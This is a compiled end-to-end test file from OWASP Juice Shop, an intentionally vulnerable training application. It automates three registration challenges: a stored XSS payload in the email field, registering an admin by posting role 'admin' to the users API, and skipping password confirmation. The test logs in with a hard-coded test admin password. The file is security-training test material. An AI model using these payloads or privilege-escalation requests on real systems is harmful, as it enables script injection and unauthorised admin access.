"use strict";
/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */
Object.defineProperty(exports, "__esModule", { value: true });
const config = require("config");
const user_1 = require("../../models/user");
const protractor_1 = require("protractor");
const e2eHelpers_1 = require("./e2eHelpers");
const utils = require('../../lib/utils');
describe('/#/register', () => {
    beforeEach(() => {
        void protractor_1.browser.get(`${e2eHelpers_1.basePath}/#/register`);
    });
    if (!utils.disableOnContainerEnv()) {
        describe('challenge "persistedXssUser"', () => {
            (0, e2eHelpers_1.beforeEachLogin)({ email: `admin@${config.get('application.domain')}`, password: 'admin123' });
            it('should be possible to bypass validation by directly using Rest API', async () => {
                void protractor_1.browser.executeScript((baseUrl) => {
                    const xhttp = new XMLHttpRequest();
                    xhttp.onreadystatechange = function () {
                        if (this.status === 201) {
                            console.log('Success');
                        }
                    };
                    xhttp.open('POST', `${baseUrl}/api/Users/`, true);
                    xhttp.setRequestHeader('Content-type', 'application/json');
                    xhttp.send(JSON.stringify({
                        email: '<iframe src="javascript:alert(`xss`)">',
                        password: 'XSSed',
                        passwordRepeat: 'XSSed',
                        role: 'admin'
                    }));
                }, protractor_1.browser.baseUrl);
                void protractor_1.browser.driver.sleep(5000);
                void protractor_1.browser.waitForAngularEnabled(false);
                const EC = protractor_1.protractor.ExpectedConditions;
                void protractor_1.browser.get(`${e2eHelpers_1.basePath}/#/administration`);
                void protractor_1.browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present on /#/administration");
                void protractor_1.browser.switchTo().alert().then(alert => {
                    expect(alert.getText()).toEqual(Promise.resolve('xss'));
                    void alert.accept();
                    // Disarm XSS payload so subsequent tests do not run into unexpected alert boxes
                    user_1.UserModel.findOne({ where: { email: '<iframe src="javascript:alert(`xss`)">' } }).then((user) => {
                        user.update({ email: '&lt;iframe src="javascript:alert(`xss`)"&gt;' }).catch((error) => {
                            console.log(error);
                            fail();
                        });
                    }).catch((error) => {
                        console.log(error);
                        fail();
                    });
                });
                void protractor_1.browser.waitForAngularEnabled(true);
            });
            (0, e2eHelpers_1.expectChallengeSolved)({ challenge: 'Client-side XSS Protection' });
        });
    }
    describe('challenge "registerAdmin"', () => {
        it('should be possible to register admin user using REST API', () => {
            void protractor_1.browser.executeScript((baseUrl) => {
                const xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function () {
                    if (this.status === 201) {
                        console.log('Success');
                    }
                };
                xhttp.open('POST', `${baseUrl}/api/Users/`, true);
                xhttp.setRequestHeader('Content-type', 'application/json');
                xhttp.send(JSON.stringify({ email: 'testing@test.com', password: 'pwned', passwordRepeat: 'pwned', role: 'admin' }));
            }, protractor_1.browser.baseUrl);
        });
        (0, e2eHelpers_1.expectChallengeSolved)({ challenge: 'Admin Registration' });
    });
    describe('challenge "passwordRepeat"', () => {
        it('should be possible to register user without repeating the password', () => {
            void protractor_1.browser.executeScript((baseUrl) => {
                const xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function () {
                    if (this.status === 201) {
                        console.log('Success');
                    }
                };
                xhttp.open('POST', `${baseUrl}/api/Users/`, true);
                xhttp.setRequestHeader('Content-type', 'application/json');
                xhttp.send(JSON.stringify({ email: 'uncle@bob.com', password: 'ThereCanBeOnlyOne' }));
            }, protractor_1.browser.baseUrl);
        });
        (0, e2eHelpers_1.expectChallengeSolved)({ challenge: 'Repetitive Registration' });
    });
});
//# sourceMappingURL=registerSpec.js.map